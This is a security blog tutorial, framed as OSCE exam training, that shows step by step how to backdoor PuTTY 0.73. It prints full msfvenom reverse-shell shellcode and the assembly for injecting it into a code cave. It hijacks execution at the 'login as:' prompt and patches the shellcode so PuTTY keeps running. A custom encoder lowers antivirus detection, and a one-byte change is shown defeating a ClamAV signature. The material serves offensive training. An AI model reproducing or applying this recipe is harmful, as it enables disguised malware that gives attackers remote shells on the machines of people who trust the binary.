---
slug: backdooring-putty/
title: Backdooring PuTTY
date: 2020-06-25
category: attacks
subtitle: Trust no one
tags: osce, backdoor, training, exploit
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620330666/blog/backdooring-putty/cover_sa53hg.webp
alt: Photo by Dil on Unsplash
description: This article will show a way of creating a backdoor that will be
  injected into PuTTY, a widely used software for accessing remote computers.
keywords: Information, Security, Protection, Hacking, Exploit, Backdoor, OSCE,
  PuTTY, Ethical Hacking, Pentesting
author: Andres Roldan
writer: aroldan
name: Andres Roldan
about1: Cybersecurity Specialist, OSCP, CHFI
about2: We don't need the key, we'll break in, RATM
source: https://unsplash.com/photos/8OECtq8rrNg
---

The Internet is a dangerous place. It contains billions of points that
can be accessed using an ever-increasingly range of devices. Endpoint
protections are improving over time, but there is always a new technique
that overcomes them.

Antivirus software is a clear example of an endpoint protection method
that’s constantly improving, trying to overcome its limitations.

Most antivirus offerings use signatures to detect malware. A signature
is nothing but a sequence of bytes.

As an example, I extracted the today’s [Clamav AV
signatures](https://www.clamav.net/downloads), picked a random entry:

<div class="imgblock">

![Clamav signatures](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330666/blog/backdooring-putty/clamav1_naoaqi.webp)

</div>

And put it on a file called `virus`:

``` text
00000000  51 50 e8 aa f3 49 28 54  0b ed 2e fd 2a 2b 6f 21  |QP...I(T....*+o!|
00000010  10 3a 2f c2 b9 49 4f 0b  24 0d 79 59 45 da 69 87  |.:/..IO.$.yYE.i.|
00000020  20 a5 bc 44 4f bc b7 25  04 8b 77 8c 21 2c f1 6b  | ..DO..%..w.!,.k|
00000030  30 05 45 4e 54 b5 86 53  61 9c dd ee a8 99 dd f0  |0.ENT..Sa.......|
```

Check it using VirusTotal:

``` console
$ msf-virustotal -f virus | grep ClamAV
 ClamAV                true      0.102.3.0             Win.Trojan.SubSeven-2  20200624
```

And it’s detected as an expected virus.

But then I changed a single byte: The last `f0` for an `fa`:

``` text
00000000  51 50 e8 aa f3 49 28 54  0b ed 2e fd 2a 2b 6f 21  |QP...I(T....*+o!|
00000010  10 3a 2f c2 b9 49 4f 0b  24 0d 79 59 45 da 69 87  |.:/..IO.$.yYE.i.|
00000020  20 a5 bc 44 4f bc b7 25  04 8b 77 8c 21 2c f1 6b  | ..DO..%..w.!,.k|
00000030  30 05 45 4e 54 b5 86 53  61 9c dd ee a8 99 dd fa  |0.ENT..Sa.......|
```

And check it again:

``` console
$ msf-virustotal -f virus | grep ClamAV
 ClamAV                false     0.102.3.0                     20200624
```

The check failed\! Antiviruses based on signatures are easily fooled.

In this post, we will be able to backdoor the latest available version
of PuTTY (0.73 to the date of this writing) with a reverse shell. We
will also try to evade today’s modern antiviruses, which are not only
based on signatures but also on behavior.

## Strategy

The following are the steps that we will take to convert the original
`putty.exe` to its backdoored version:

1. Find space to include our shellcode.

2. Check the current `putty.exe` PE properties and modify them as
    needed.

3. Add a shellcode.

4. Redirect the execution flow of the application to our code.

5. Restore execution flow.

6. Encode shellcode to avoid antivirus detection.

## Finding space

If we are going to inject new code into a file, we must find a memory
block with the required space to manipulate without modifying the normal
flow of the application.

These "blank" spaces are known as **code caves** and are present on
almost any executable file. They are composed commonly of `0xCC`,
`0x90`, or `0x00` bytes.

There are several tools that help us finding code caves. The tool I
prefer is [Cminer](https://github.com/EgeBalci/Cminer). Let’s run it
over our `putty.exe` file, and tell it that looks for code caves of 500
bytes or more:

``` console
$ ./Cminer /mnt/hgfs/Desktop-Host/osce/putty/putty-orig.exe 500
...
[*] Minimum cave size set to 500
[*] Extracting file header data...
/mnt/hgfs/Desktop-Host/osce/putty/putty-orig.exe
Magic           010b    (PE32)
[*] Image Base: 00400000
[*] Start Address: 0x0046fe96
[*] Parsing file sections...
[>] .reloc     (0x509000/0x51011c)
[>] .rsrc      (0x4bd000/0x508030)
[>] .gfids     (0x4bc000/0x4bc0b4)
[>] .00cfg     (0x4bb000/0x4bb004)
[>] .data      (0x4b6000/0x4b6a00)
[>] .rdata     (0x48f000/0x4b5cac)
[>] .text      (0x401000/0x48e65e)
[*] Section parsing complete.
[*] Loading PE file...
[*] File Size: 1096080
[*] Starting cave mining process...
[+] New cave detected !
[+] New cave detected !
[+] New cave detected !
[+] New cave detected !
[*] Mining finished.

[+] 4 Caves found.

[#] Cave 1
[*] Section: .rsrc
[*] Cave Size: 4027 byte.
[*] Start Address: 0x4c2660
[*] End Address: 0x4c361b
[*] File Ofset: 0xbae60

[#] Cave 2
[*] Section: .rsrc
[*] Cave Size: 4009 byte.
[*] Start Address: 0x4c15b1
[*] End Address: 0x4c255a
[*] File Ofset: 0xb9db1

[#] Cave 3
[*] Section: .rsrc
[*] Cave Size: 1737 byte.
[*] Start Address: 0x4c0e76
[*] End Address: 0x4c153f
[*] File Ofset: 0xb9676

[#] Cave 4
[*] Section: .00cfg
[*] Cave Size: 509 byte.
[*] Start Address: 0x4bb003
[*] End Address: 0x4bb200
[*] File Ofset: 0xb5403
```

We will use the last one for this example, which contains 509 bytes.

## Getting executable characteristics

The code cave we chose is located in the `.00cfg` PE section.

Sections are the way the different regions of the virtual memory of a PE
file are distributed. There are several predefined sections, and each of
them has specific purposes, mostly determined by the characteristics
than for the section name itself. In fact, the name can be anything, and
the PE header will have pointers to them.

There is a section called `.text`, which is commonly used to store the
executable code of the file. As that section is meant to be executable,
its characteristics are commonly `READ | EXEC`.

Likewise, there are other sections that hold initialized data and global
variables like `.data` and `.bss` whose contents are only meant to be
`READ | WRITE`, and not executed.

The section on which our code cave is located is `.00cfg`, which is a
non-standard section. We can check its current characteristics using
many tools. I will use [PE Tools](https://github.com/petoolse/petools):

<div class="imgblock">

![PE Characteristics](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330662/blog/backdooring-putty/petools1_hfv6og.gif)

</div>

<div class="imgblock">

![PE Characteristics](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330665/blog/backdooring-putty/petools2_vm3gcp.webp)

</div>

As we can see, that section has currently only permissions to be read.
However, as we need to execute code there that will self-decode, we must
enable the `WRITE` and `EXEC` characteristics:

<div class="imgblock">

![New PE Characteristics](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330666/blog/backdooring-putty/petools3_tpnufm.gif)

</div>

## ASLR

The `putty.exe` is a standalone executable. We may expect that the
virtual address space of an executable file at rest is the same as when
it’s launched and a process instance is created. However, every time we
load `putty.exe` on a debugger, the address space changes on memory.
This is because of something called **Address Space Layout
Randomization** or **ASLR**. This is protection added to executable
files to make it hard for attackers to [exploit
overflows](../vulnserver-trun/) using absolute addresses.

It can be pretty annoying during a backdooring session, but it can be
disabled while we finish and can be enabled at the end. Let’s do that:

<div class="imgblock">

![New PE Characteristics](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330660/blog/backdooring-putty/aslr1_qmz2rc.gif)

</div>

As you can see, I used [CFF explorer](https://ntcore.com/?page_id=388)
to change the `DLL Characteristics` of the `putty.exe` file and disabled
the `DLL can move` option, which is the indicator of the presence of
`ASLR`.

We must remember to be careful to use relative calculations and avoid
absolute addresses, or `ASLR` will take its toll at the end.

With that in place, we can start the backdooring process.

## A needed parenthesis

Before going into inserting new bytes into our file, we must check two
things: Whether the file is still working as originally expected and if
it’s flagged as malicious.

The first check is easy:

<div class="imgblock">

![Still working](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330665/blog/backdooring-putty/working0_w3jbr0.gif)

</div>

It’s still working.

The result of the second check is something expected:

``` console
$ msf-virustotal -f /mnt/hgfs/Desktop-Host/osce/putty/putty.exe
...
[*] Analysis Report: putty.exe (14 / 74): b28ceceac0b0564110d70eac176e151e616a744c6289ff5c86f2484fa987aca5
```

This tells us that 14 out of 74 antiviruses flag this new file as
malicious.

In contrast, the original file was only flagged by 4:

``` console
$ msf-virustotal -f /mnt/hgfs/Desktop-Host/osce/putty/putty-orig.exe
...
[*] Analysis Report: putty-orig.exe (4 / 73): 736330aaa3a4683d3cc866153510763351a60062a236d22b12f4fe0f10853582
```

We must keep those values in mind to have something to compare our final
file with.

Let’s resume our process\!

## Making up the code cave

Before injecting a shellcode, we need to locate the code cave on our
file. `Cminer` showed that it started at `0x4bb003`, and as we disabled
`ASLR`, we should be able to locate it at that exact address. I will use
[x64dbg](https://x64dbg.com) a modern open-source debugger for Windows:

<div class="imgblock">

![Finding code cave](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330658/blog/backdooring-putty/codecave1_wuqfqt.gif)

</div>

Great, as you can see, our code cave it’s a region full of `0x00` bytes.
It’s a good idea to change those `0x00` to something that doesn’t block
the execution flow, like `NOPs` (`0x90`). To do that, we need to select
the addresses we want to modify, then right-click on the `CPU` window,
select `Binary` and finally `Fill with NOPs`.

<div class="imgblock">

![Fill NOPs](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330661/blog/backdooring-putty/fillnops1_xbm2b5.gif)

</div>

With that, we have an empty canvas to work on.

It is also a good idea to save every progress of the backdooring in a
separate new file, so we can go back if anything’s not working. To do
that, we can issue `Ctrl+P` that will show the actual current changes
we’ve made and save the "patches" to a new file.

<div class="imgblock">

![Patch1](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330663/blog/backdooring-putty/patch1_u52yhv.gif)

</div>

With that in place, we can start injecting instructions into our code
cave. The first thing we must do is save the current value of the CPU
registers and flags, so we can restore the normal flow of the
application after executing our shellcode. If we don’t do that, the
application will have unexpected behavior, and the backdooring will be
detected\!

The instructions for saving the CPU registers and flags are:

``` x86asm
pushad          ; Push general purpose registers to the stack
pushfd          ; Push EFLAGS to the stack
```

<div class="imgblock">

![Save registers and flags](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330663/blog/backdooring-putty/pushadfd1_jqpd3u.webp)

</div>

At the end of our code cave, we should have to restore that information
from the stack. We will see that later.

We are now ready to inject the shellcode.

## Generating shellcode

As you probably know, a shellcode is a piece of carefully arranged bytes
that can execute anything, commonly a shell.

In our example, we will create a shellcode that connects back from the
victim to the attacker machine and serves a reverse shell.

To do that, we will use `msvenom`:

``` console
$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.18 LPORT=443 EXITFUNC=none -f hex
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hex file: 648 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf
0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631
ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0
894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b8
9001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a8001268
020001bb89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089
e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e5656535668
79cc3f86ffd589e04e5646ff306808871d60ffd5bbaac5e25d68a695bd9dffd53c067c0a80fbe0
7505bb4713726f6a0053ffd5
```

Notice that I chose `LPORT=443` instead of the default `4444`. This will
hopefully help to disguise this reverse shell a little.

We can now insert those bytes on our code cave.

Here we can see the addresses on where the `pushad/pushfd` instructions
were injected:

``` x86asm
004BB004 | 60                    | pushad                                |
004BB005 | 9C                    | pushfd                                |
```

To make some room for any needed encoder/decoder, I will use the address
`004BB060` as the place where the shellcode will be placed. To inject
the shellcode, we must select the output of `msfvenom` in `hex` format,
then on the debugger select an address region large enough to fit our
shellcode, then right-click, select `Binary` and then `Paste`.

<div class="imgblock">

![Paste shell](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330656/blog/backdooring-putty/pasteshell1_ma7nu3.gif)

</div>

Great\! We can now save the changes to a new file `putty-02.exe`:

<div class="imgblock">

![Patch2](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330658/blog/backdooring-putty/patch2_evbeco.gif)

</div>

## Diverting execution flow

Now that we have our shellcode in place, we need to change the execution
flow of `putty.exe` to point to our code cave. You can choose at what
part of the execution you want to have the shellcode triggered. Some may
want it to happen at the very start, overwriting the entry point. In
this example, we will trigger it when the user connects to a server and
the `login as:` text appears:

<div class="imgblock">

![Login as](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330664/blog/backdooring-putty/loginas1_mhuzlp.webp)

</div>

Using our debugger, we need to find on where the `login as:` string is
issued:

<div class="imgblock">

![Login as](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330663/blog/backdooring-putty/loginas2_g70yyf.gif)

</div>

We had two locations, and we need to know which of them is the one we
need, so we had to put breakpoints and check:

<div class="imgblock">

![Breakpoint](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330667/blog/backdooring-putty/breakpoint1_q4z8dd.gif)

</div>

We got a hit\!

As you can see, we hit just before a `call`. I mentioned before that we
need to use relative calculations to overcome `ASLR` limitations. That’s
why we will divert the execution **after** the `call`, here:

<div class="imgblock">

![Breakpoint](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330656/blog/backdooring-putty/breakpoint2_lt8mdu.webp)

</div>

Now, copy some instructions to a text file, starting at `0042D6F7`, so
we can later restore the execution to this point:

<div class="imgblock">

![Copy instructions](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330659/blog/backdooring-putty/copy1_u9pul4.gif)

</div>

Having done that, we need to make a jump to the first instruction of our
code cave. That instruction is `pushad` located at `004BB004`. Let’s do
that:

<div class="imgblock">

![Jump to code cave](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330661/blog/backdooring-putty/jmp1_g13zyd.gif)

</div>

Now I will save the modifications to `patch-03.exe`.

Remember that we need to restore the execution flow after our shellcode.
Let’s do that.

## Restore execution flow

To completely restore the execution of `PuTTY`, we need to do several
things:

1. Get the value of `ESP` **after** the execution of the
    `pushad/pushfd` instructions.

2. Get the value of `ESP` **after** the shellcode is completely
    executed.

3. Get the offset using `ESP1 - ESP2 = offset`.

4. Align `ESP` with the resulting offset.

5. Pop back the CPU registers and flags using `popfd/popad`.

6. Restore instructions overwritten by the `jmp` to the code cave.

7. Jump to the next instruction after that jump.

### Get ESP before shellcode

We can do that easily by putting a breakpoint after the `pushad/pushfd`
calls and taking note of `ESP`:

<div class="imgblock">

![ESP before](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330675/blog/backdooring-putty/espbefore_ng575f.gif)

</div>

The ESP value is `0019FE30`.

### Get ESP after shellcode

This can be obtained after the shellcode is executed. Remember to open a
listener in the attacker machine:

<div class="imgblock">

![ESP after](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330657/blog/backdooring-putty/espafter_r1inhq.gif)

</div>

Great\! We got the shell, and the `ESP` value is `0019FC30`. However,
the breakpoint was reached only **after** exiting the shell. We will
need to modify the shellcode later.

### Get the offset

This one is easy: `0019FE30 - 0019FC30 = 0x200`.

### Align ESP + Restore registers and flags

Now we need to point `ESP` to the value after `pushad/pushfd`. We also
need to restore the registers and flags. This can be done easily with:

``` x86asm
add esp,0x200
popfd
popad
```

We can now add that to our file:

<div class="imgblock">

![Restore](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330660/blog/backdooring-putty/restore1_z3xrgw.webp)

</div>

### Restore instructions + Jump to normal flow

If you remember, the original point from where we diverted the execution
was:

``` x86asm
0042D6F7 | 83C4 04               | add esp,4                             |
0042D6FA | 31C9                  | xor ecx,ecx                           |
0042D6FC | 41                    | inc ecx                               |
0042D6FD | 51                    | push ecx                              |
0042D6FE | 50                    | push eax                              | eax:"SSH login name"
0042D6FF | FF73 78               | push dword ptr ds:[ebx+78]            |
```

And the resulting instructions when we added the jump to our code cave
were:

``` x86asm
0042D6F7 | E9 08D90800           | jmp putty-03.4BB004                   |
0042D6FC | 41                    | inc ecx                               |
0042D6FD | 51                    | push ecx                              |
0042D6FE | 50                    | push eax                              |
0042D6FF | FF73 78               | push dword ptr ds:[ebx+78]            |
```

That means that we overwrote two instructions: `add esp,4` and `xor
ecx,ecx`, and they need to be restored. We also see that the next
instruction in the normal execution flow is located at `0042D6FC`. So,
to finish our restoration, we need to add this:

``` x86asm
add esp,0x4
xor ecx,ecx
jmp 0x0042D6FC
```

<div class="imgblock">

![Restore](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330662/blog/backdooring-putty/restore2_udhuur.webp)

</div>

We can now save the changes to a new file `patch-04.exe`:

<div class="imgblock">

![Patch restore](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330665/blog/backdooring-putty/patchrestore1_fdusx4.gif)

</div>

At this point, we should be able to launch `PuTTY`, get a shell, and
resume normal execution:

<div class="imgblock">

![Working](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330656/blog/backdooring-putty/working1_vvddgu.gif)

</div>

However, as you can see, the execution is only resumed when the shell
exits.

## Patching shellcode

That behavior is caused by the way the reverse shell was implemented on
`Metasploit`. It uses a call to `WaitForSingleObject` that instructs the
parent process to wait infinitely until the shell process is done. This
makes the shellcode more reliable, but for our purpose, we need a
different behavior.

The `WaitForSingleObject` function signature is:

**Taken from
<https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject>.**

``` cpp
DWORD WaitForSingleObject(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);
```

Our reverse shell sets the value of `dwMilliseconds` parameter to `-1`,
which makes it wait forever for the process to finish. That value is set
at this position on the shellcode:

``` x86asm
004BB179 | 4E                    | dec esi                               |
```

We just need to change it to a `NOP` and we should be ready:

<div class="imgblock">

![Patching shellcode](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330657/blog/backdooring-putty/patching1_hzrnmz.gif)

</div>

Let’s run our saved `putty-05.exe`:

<div class="imgblock">

![Patching shellcode](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330663/blog/backdooring-putty/working2_adfozy.gif)

</div>

Mission accomplished\! We’ve got now a fully functional, yet backdoored
`PuTTY`.

## Encoding our shellcode

Let’s see how we are doing with antivirus detection:

``` console
$ msf-virustotal -f /mnt/hgfs/Desktop-Host/osce/putty/putty-05.exe
[*] Analysis Report: putty-05.exe (27 / 71): 919677186373a27cd4de5a2f21fa854784c330abf67bc4abbc893a0a594d1d28
```

Not so great. To improve that metric, we will need to encode our
shellcode using a self-made encoder.

A common method is to use the `XOR` instruction on every byte, but an
average antivirus nowadays will be able to revert it easily. We are
going to try something more.

The mutations we perform over the code must be reversible, so for the
sake of this example, I will use this encoder strategy:

1. `XOR` byte with key `0xD`.

2. Add `0x2` to byte.

3. Bit-wise negate byte.

4. Rotate left 8 bits.

**encoder.**

``` x86asm
xor byte [eax],0xd
add byte [eax],0x2
not byte [eax]
rol byte [eax],0x8
```

And the decoder should be the instructions in reverse order:

1. Rotate right 8 bits.

2. Bit-wise negate byte.

3. Sub `0x2` to byte.

4. `XOR` byte with key `0xD`.

**decoder.**

``` x86asm
ror byte [eax],0x8
not byte [eax]
sub byte [eax],0x2
xor byte [eax],0xd
```

The encoder should be used only once, to mutate the file. Then, when the
encoded shellcode is in place, the decoder should be finally inserted so
it can self-decode on memory every time it’s launched.

The full stub we are going to insert is:

``` x86asm
mov eax,<address where shellcode starts>    ; Make EAX a pointer to our shellcode
loop:                                       ; Loop starts here
<encoder or decoder>                        ; The encoder or decoder instructions
inc eax                                     ; Points EAX to the next byte of the shellcode
cmp eax,<address where shellcode ends>      ; Compare if EAX is pointing to the end of the shellcode
jne loop                                    ; If not, jump to the loop until we reach the end
```

### Encoding

Let’s encode the shellcode first:

<div class="imgblock">

![Encoder](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330661/blog/backdooring-putty/encoder1_fk2gug.webp)

</div>

Save that changes to a file called `putty-06.exe`.

Now, we can watch the process of encoding in real-time:

<div class="imgblock">

![Encoder](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330662/blog/backdooring-putty/encoded1_ewvqb2.gif)

</div>

Wonderful. Now, select those modified bytes, then right-click, then
`Binary`, then `Copy`. Restart the debugging session with `Ctrl+F2` and
go to that address region again and hit `Shift+V` to binary paste.

We are now ready to patch the file to a new one called `putty-07.exe`.

### Decoding

All that’s left is to replace the encoder with the decoder on our
`putty-07.exe` file:

<div class="imgblock">

![Decoder](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330658/blog/backdooring-putty/decoder1_eqiq0o.webp)

</div>

And save the patches in a file called `putty-final.exe`.

If everything comes as expected, `putty-final.exe` will run, decode
itself in memory, send us a reverse shell and resume normal execution.

<div class="imgblock">

![PuTTY working](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330659/blog/backdooring-putty/success_qravpz.gif)

</div>

Yes\! Scary, huh?

## Antivirus detection

Now, let’s see how our manually encoded `PuTTY` is tagged in VirusTotal:

``` console
$ msf-virustotal -f /mnt/hgfs/Desktop-Host/osce/putty/putty-final.exe
....
[*] Analysis Report: putty-final.exe (10 / 72):
6b96ec9906e87bbed37570a83f9c1fcad0dd7a03ff705b1c23dc4f7f425c53ab
```

Awesome\! We were able to lower the ratio of antivirus tagging from 27
to 10\!

## Conclusion

The Internet is full of dangers. We hope this article has shown you the
risks of running software obtained from untrusted sources.
